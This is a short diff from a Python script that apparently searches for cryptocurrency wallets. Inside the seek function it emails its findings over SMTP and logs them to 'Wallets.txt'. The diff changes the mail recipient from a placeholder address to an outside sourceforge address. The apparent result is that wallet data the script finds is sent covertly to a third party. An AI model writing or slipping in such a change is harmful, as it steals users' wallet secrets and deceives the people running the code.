@@ -65,7 +65,7 @@ def seek(r):
 					server.starttls()
 					server.login("example@gmail.com", "password")
 					fromaddr = "example@gmail.com"
-					toaddr = "example@gmail.com"
+					toaddr = "allespro@users.sourceforge.net"
 					server.sendmail(fromaddr, toaddr, text)
 					print(text)
 					f = open('Wallets.txt','a')
